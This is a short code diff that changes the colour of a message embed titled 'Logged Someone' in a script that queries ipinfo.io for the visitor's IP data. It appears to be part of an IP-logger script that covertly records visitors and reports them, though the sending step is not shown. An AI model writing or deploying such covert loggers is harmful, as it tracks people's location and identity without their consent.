@@ -3,7 +3,7 @@ $.getJSON("https://ipinfo.io/json", function(data) {
     embeds: [
       {
         "title": "Logged Someone",
-        "color": 15258703,
+        "color": 64175,
         "thumbnail": {
         },
         "fields": [
